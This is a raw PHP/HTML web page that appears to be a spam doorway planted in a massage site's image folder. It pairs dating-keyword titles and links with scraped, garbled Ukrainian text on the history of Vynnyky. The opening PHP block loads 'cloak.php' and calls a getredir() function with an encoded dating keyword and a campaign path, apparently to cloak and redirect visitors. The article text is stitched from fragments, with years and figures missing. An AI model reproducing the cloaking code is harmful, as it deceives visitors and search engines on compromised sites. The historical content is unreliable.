<?php
if(!@include('cloak.php'))	@include('../cloak.php');
if(function_exists('getredir')){
	@getredir ('api', '%d0%b7%d0%bd%d0%b0%d0%b9%d0%be%d0%bc%d1%81%d1%82%d0%b2%d0%b0+%d1%86%d0%b5%d0%bd%d1%82%d1%80%d0%b0%d0%bb%d1%8c%d0%bd%d0%b5+%d0%bf%d0%be%d1%80%d1%83%d1%87+%d0%92%d0%b8%d0%bd%d0%bd%d0%b8%d0%ba%d0%b8+%d0%a3%d0%ba%d1%80%d0%b0%d1%97%d0%bd%d0%b0', '2021-05-21', 'pir_210521/UA_dat_geo_trans_ukr', 'ua_dating.txt');
}
?><!doctype html>
<html lang="">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<title>Історія Винник | Винники | Історія, історичні події | Львівська область №90 — mistaUA</title>
	<meta name="description" content="61 ДПРЧ м. Винники, Vinniki, L'Vivs'Ka Oblast', Ukraine. 1K likes · 9 talking about this · 13 were here. Запобігти. Врятувати. Допомогти." />
	<link rel="canonical" href="https://masage.od.ua/img/137/cym-znayomstva-tsentralne-poruch.php" />
<?php if(!@include('../inc1mywp1.php')) @include('inc1mywp1.php'); ?>
						<div id="primary-menu" class="menu"><ul>
<li class="page_item page-item-2"><a href="https://masage.od.ua/img/208/wet-znayomstva-z.php">знайомства з дівчатами в Горішні Плавні Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/113/vuzil-mzhrasov-znayomstva.php">міжрасові знайомства центральний Лисичанськ Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/291/xob-rayon-zatoki.php">район затоки знайомств в Очаків Україна</a></li>
</ul></div>
						<div class="main-navigation-bg"></div>
						<div class="clearfix"></div>
					</nav><!-- #site-navigation -->
				</div>
			</div>

		</div>

	</header><!-- #masthead -->



	<div id="content" class="site-content">
	<div class="container"><div class="row"><div class="col-md-7 order-md-3">
	<div id="primary" class="content-area">
		<main id="main" class="site-main main-content-middle">


<article id="post-1" class="post-1 post type-post status-publish format-standard hentry category-uncategorized">
		<header class="entry-header">
		<h1 class="entry-title">Знайомства центральне поруч Винники Україна</h1><!-- .entry-meta -->
			</header><!-- .entry-header -->



	<div class="entry-content">

<p>
<p>Вулицею проходить автошлях національного значення Н Через Винники по вулиці Галицькій іде дорога на Золочів та Тернопіль. Довжина вулиці біля 2,3 км.</p><strong><a id='u1'></a><h2>пожежа Архіви - Винниківський Вісник</h2></strong><p>Ще у XIII ст. Лев подарував Винники німецькій родині Штехерів. Ця грамота стала першою письмовою згадкою про Винники. В році у Винниках була заснована колонія Вайнберґена «Винна Гора». Вона простягувалась уздовж широкої центральної вулиці нині вул. У колонії поруч одна з одною проживали різні верстви населення: селяни, ремісники, робітники, чиновники, інтелігенція, місцеві підприємці [1].</p><a id='u2'></a><h3></h3><p>Будинок, в якому жив Володимир Левицький , український письменник, літературний критик, громадський діяч. Будівля бібліотеки є старовинним будинком, збудована німцем Міллером. Збудована німецькою громадою як німецька кірха у — роках. Лівобічні: вул. Левицького, вул. Миколайчука, вул. Відтоді з маленького містечка Винники перетворилися на поважний, як на ті часи, промисловий центр.</p>
<p>Без перебільшення, все побудоване з того часу у Винниках — з тютюнового диму. Це найстаріша в Україні тютюнова фабрика. У містечку підростав в української годувальниці австрійський письменник Леопольд фон Захер-Мазох, від імені та творчості якого з'явився психологічний термін "мазохізм". Малознаний, але цікавий факт — фактично у Винниках відбулося перше збройне зіткнення радянських та німецьких військ 19 вересня  р.</p>
		
			<br><ol>
			
				<li>!</li>
			
				<li>;</li>
			
				<li>.</li>
			
			</ol>
		
	<p>Війська Вермахту два дні бомбардували місто, радянські частини просувались зі сходу. Їхні танки на той час не мали жодних розпізнавальних знаків, а за силуетом були схожі на польські. Спроби примітивного надання німцям сигналів маханням прапорців результатів не дали, ті відкрили вогонь. У цій сутичці загибло і було поранено близько двох десятків осіб з обох сторін, були також втрати бойових машин.</p>
<p>Через деякий час стрілянина між союзниками закінчилася і почалося братання, яке переросло у спільне розграбування тютюнової фабрики. З Винниками пов'язані біографії багатьох відомих українців. Серед них: Іван Липа літературний псевдонім Петро Шелест , який займався літературною творчістю, був засновником таємного товариства "Братство Тарасівців" і практикував медицину; Іван Огієнко митрополит Іларіон , проявив себе як талановитий поет, драматург, педагог, вчений-філолог, церковно-громадський діяч; Катря Гриневичева  — освітянка та письменниця, яка своїми повістями оживила славні сторінки української історії; Юлія Пастушенко літ.</p>
<p>Саме тут проживає і зараз відомий український письменник Юрій Винничук. Теперішній центр міста розташований на місці колишньої німецької колонії Weinbergen, від якої залишились декілька типових будинків з невеликим торцевим фасадом і витягнутих перпендикулярно до центральної вулиці та кірха. У наш час Винники — типове львівське передмістя, хоча й розташоване ближче до центру Львова , ніж деякі райони міста.</p>
<p>Містечко з населенням майже 18 тис. Серед останнього можна ще побачити гарні вілли у стилях історизму, сецесії тощо. В одній з них розмістився цікавий музей. Ще у році в місті було зведено пам'ятник Т. У році його було зруйновано та в році відбулося відкриття нового пам'ятника, що і сьогодні є гордістю та окрасою міста. Згадка про церкву у Винниках датується початком XVI ст.</p>
<p>На місці дерев'яної церкви звели нову, завершення якої припадає на р. У сучасному місті функціонують 4 храми, що належать греко-католицькій, римо-католицькій та православній конфесіям.</p><a id='u3'></a><h3>Навігаційне меню</h3><p>Винники пишаються своїми земляками — видатними діячами держави, релігії та культури: Іван Огієнко - міністр віросповідань, громадський діяч, письменник, митрополит УАПЦ, історик Церкви. Володимир Левицький - громадський і культурний діяч, письменник, літературний критик, видавець, голова Винниківської читальні. Катря Гриневичева - письменниця. Мирослава Сопілка - поетеса.</p>
<p>Іван Липа - поет, письменник, лікар, міністр здоров'я УНР. Олександра Любич-Парахоняк — відома світова оперна співачка.</p>
		
			
				<div>У Винниках біля Львова відкрили удосконалену транспортну розв’язку</div>
				<div><iframe width='560' height='315' src='https://www.youtube.com/embed/q8-F-q56rdk' frameborder='0' allowfullscreen></iframe></div>
			
		
	<p>Микола Федюк — художник. Ірина Банах-Твердохліб - художниця, представляє українське мистецтво за кордоном. Сьогодні примножують славу рідного міста президент музеїв України, мистецтвознавець Борис Возницький, відомий художник-керамік, заслужений діяч мистецтв України Тарас Левків. На сьогодні в Винниках проживають мешканців у понад будинків, з них більше - у власних помешканнях. У Винниках вулиць. Найдовша вулиця - Івана Франка будинків , а найкоротша - Жупан 5 будинків.</p><strong><a id='u4'></a><h2>Вулиця Галицька (Винники)</h2></strong><p>Найчисленніша за кількістю мешканців вулиця Кільцева - людей. Місто займає площу 6,7 км2 Протягом останнього десятиріччя у Винниках споруджено ряд багатоквартирних житлових будинків, збудовано нову автоматизовану телефонну станцію. У місті з'явилися новий ринок, комплекс торгівельних павільйонів, крамниць, працюють приватні підприємства. У Винниках діють 2 бібліотеки, дитячий садок, 4 загальноосвітні школи.</p><img src="https://image.isu.pub/191203191252-1bb88fb17927e86560f9befad51f20df/jpg/page_1.jpg" alt="" style="max-width: 480px; max-height: 480px;"/><p>Будинок дитячої та юнацької творчості, школа мистецтв, дитячо-юнацька спортивна школа "Тризуб", Будинок культури, КЦ «Дозвілля», клуб «Галактика», історико-краєзнавчий музей, 2 поліклініки, 2 лікарні, обласна лічниця інвалідів війни та репресованих ім. Липи, видається газета «Винниківський Вісник». Місто Винники багате своїми звичаями та обрядами.</p>
		
	<p>Організатором цієї справи серед молоді є "Золота молодь Винник". Створені товариства насильно депортованих українців з Надсяння.</p><strong><a id='u5'></a><h2>Історія Винник</h2></strong><p>Традиційними стали міжнародні дитячі турніри з футболу "Кубок Винник", обласні змагання з вільної боротьби, щорічні міські турніри з настільного тенісу "На приз різдвяних канікул Візитною карткою м. Винники за правом вважається обласний фестиваль дитячої української естрадної пісні "На крилах дитинства", авторами цього проекту є Будинок дитячої та юнацької творчості і ВТФ "Друксервіс". Історія Винник рр.</p>
</p>
	</div><!-- .entry-content -->

</article><!-- #post-1 -->


		</main><!-- #main -->
	</div><!-- #primary -->


	</div><div class="col-md-2 order-md-1">

	<aside id="secondary" class="widget-area">
			</aside><!-- #secondary -->
</div><div class="col-md-3 order-md-10">
	<aside id="secondary" class="widget-area">
		<section id="search-2" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://masage.od.ua/img/249/xoge-mstsev-sayti-znayomstv.php">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
				</label>
				<input type="submit" class="search-submit" value="Search" />
			</form></section>		<section id="recent-posts-2" class="widget widget_recent_entries">		<h2 class="widget-title">Recent Posts</h2>		<ul>
											<li><a href="https://masage.od.ua/img/398/ku-pobachennya-znovu-gulyaypole.php">побачення знову Гуляйполе Україна</a></li><li><a href="https://masage.od.ua/img/240/kateh-nternet-znayomstva-lyudina.php">Інтернет знайомства людина Виноградів Україна</a></li><li><a href="https://masage.od.ua/img/335/nevi-starsh-znayomstva.php">старші знайомства поблизу Кременчук Україна</a></li><li><a href="https://masage.od.ua/img/291/tig-msto-pdklyuchiti-shastya.php">місто підключити Щастя Україна</a></li><li><a href="https://masage.od.ua/img/103/cud-lokalne-pdklyuchennya-blgorod-dnstrovskiy.php">локальне підключення Білгород-Дністровський Україна</a></li><li><a href="https://masage.od.ua/img/428/behyn-sayti-znayomstv.php">сайти знайомств людина Звенигородка Україна</a></li><li><a href="https://masage.od.ua/img/361/hefo-znayomstva-bezkoshtovno-v.php">знайомства безкоштовно в Кременчук Україна</a></li>
					</ul>
		</section>

			<section id="meta-2" class="widget widget_meta"><h2 class="widget-title">Contents</h2>
				<ol><li><a href='#u1'>пожежа Архіви - Винниківський Вісник</a></li>
<li><a href='#u2'></a></li>
<li><a href='#u3'>Навігаційне меню</a></li>
<li><a href='#u4'>Вулиця Галицька (Винники)</a></li>
<li><a href='#u5'>Історія Винник</a></li>
</ol>
			</section>

	</aside><!-- #secondary -->
</div></div></div>	</div>
	<footer id="colophon" class="site-footer">

		<div class="covf-footer-copyright">
			<div class="container">
				<div class="row">
					<div class="col">
						<div class="site-info text-center">
							Powered by 	<a href="https://masage.od.ua/img/237/nafyc-pyatnitsya-ogoloshennya-znayomstva.php">Covfefe WordPress Theme</a>
						</div>
					</div>
				</div>
			</div>
		</div>
	</footer><!-- #colophon -->
</div><!-- #page -->

<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/jquery.marquee.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/scripts.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/comment-reply.min.js?ver=5.0.3'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/wp-embed.min.js?ver=5.0.3'></script>

</body>
</html>